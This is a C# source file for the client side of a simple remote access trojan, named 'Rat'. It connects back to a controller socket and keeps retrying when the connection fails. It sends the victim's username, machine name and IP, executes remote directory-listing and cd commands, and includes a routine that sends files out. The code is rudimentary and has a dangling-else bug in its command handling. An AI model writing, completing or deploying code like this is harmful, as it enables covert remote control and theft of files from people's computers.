using System;
using System.Text;
using System.Net;
using System.Net.Sockets;
using System.IO;
using System.Threading;

using da_box;

/** [ ] Messaage log query
 *  [ ] Connection retries
 *  [ ] reconnect command
 */

namespace da_rat
{
    class Rat
    {
        private static ManualResetEvent _connectDone = new ManualResetEvent(false);

        private static byte[] _buffer = new byte[2048];
        private static Socket _clientSocket;

        private static Box ToolBox = new Box();


        private static void puts(string text)
        {
            Console.WriteLine(text);
            Console.Write("> ");
        }


        static void Main(string[] args)
        {
            Console.Title = "Rat";

            SetupClient();
            SendLoop();

            _clientSocket.Close();
            Console.WriteLine("Exiting...");
            // Console.ReadLine();
        }

        private static void SetupClient(string home = "127.0.0.1", int port = 1337, bool retry = false)
        {
            if (retry && _clientSocket != null)
                _clientSocket.Close();

            _clientSocket = 
                new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            
            _clientSocket.BeginConnect(IPAddress.Parse(home), port
                , new AsyncCallback(ConnectCallback), _clientSocket);

            // _connectDone.WaitOne();
        }

        private static void ConnectCallback(IAsyncResult AR)
        {
            try
            {
                Socket client = (Socket)AR.AsyncState;
                client.EndConnect(AR);

                puts("Socket connected to " + client.RemoteEndPoint.ToString());

                SendMessage(GetSysInfo());

                client.BeginReceive(_buffer, 0, _buffer.Length, SocketFlags.None, new AsyncCallback(ReceiveCallback), client);

                // _connectDone.Set();
            } catch (Exception)
            {
                Console.WriteLine("\n\nRetrying to connect...");
                Thread.Sleep(TimeSpan.FromSeconds(1));
                SetupClient(retry: true);
            }
        }

        private static void ReceiveCallback(IAsyncResult AR)
        {
            Socket socket = (Socket)AR.AsyncState;

            try
            {
                if (socket.Connected)
                {
                    int received = socket.EndReceive(AR);
                    string response = "Input was too cheesy";

                    byte[] dataBuf = new byte[received];
                    Array.Copy(_buffer, dataBuf, received);

                    string text = Encoding.ASCII.GetString(dataBuf);

                    if (text == "kill" || text == "black_plague" || text == "terminate")
                    {
                        Console.WriteLine("Received `kill` command from home.");

                        _clientSocket.Close();
                        Environment.Exit(0);
                    }

                    string[] textArr = text.Split();
                    
                    if  (textArr[0] == "dir")
                        response = ToolBox.Dir();
                    
                    else if (textArr[0] == "cd")
                        if (!ToolBox.Cd(textArr[1]))    response = "Invalid dir given...";

                    else if (textArr[0] == "INFO")
                        response = "OK";

                    puts("Pak: " + text);

                    SendMessage(response);
                }
            }
            catch (SocketException) { puts("Server disconnected..."); }
        }

        private static void SendCallback(IAsyncResult AR)
        {
            Socket socket = (Socket)AR.AsyncState;
            socket.EndSend(AR);
        }

        private static void SendMessage(string message)
        {
            byte[] buffer = Encoding.ASCII.GetBytes(message);
            _clientSocket.Send(buffer);

            _clientSocket.BeginReceive(_buffer, 0, _buffer.Length, SocketFlags.None,
                new AsyncCallback(ReceiveCallback), _clientSocket);
        }

        private static string GetSysInfo()
        {
            string localIp = String.Empty;

            var host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (var ip in host.AddressList)
            {
                if (ip.AddressFamily == AddressFamily.InterNetwork)
                    localIp = ip.ToString();
            }
            if (String.IsNullOrEmpty(localIp)) localIp = "NoAddrFound";

            /*> INFO user@machine localIp */
            return "INFO " + System.Environment.UserName + "@" +
                System.Environment.MachineName + " " + localIp;
        }


        private static void SendFile(string file)
        {
            string response = "FILE " + file + " ";
            response += ToolBox.FileToByte(file);

            /* FILE fileName headerSize ... */
            SendMessage(response);
        }

        private static void SendLoop()
        {
            while(true)
            {
                Console.Write("> ");
                string req = Console.ReadLine().Trim();

                if (req == "break" || req == "exit")
                    break;
                
                else if (req == "connect" || req == "reconnect")
                    SetupClient(retry: true);

                else if (req == "disconnect")
                    _clientSocket.Close();

                else
                    SendMessage(req);
            }
        }
    }
}
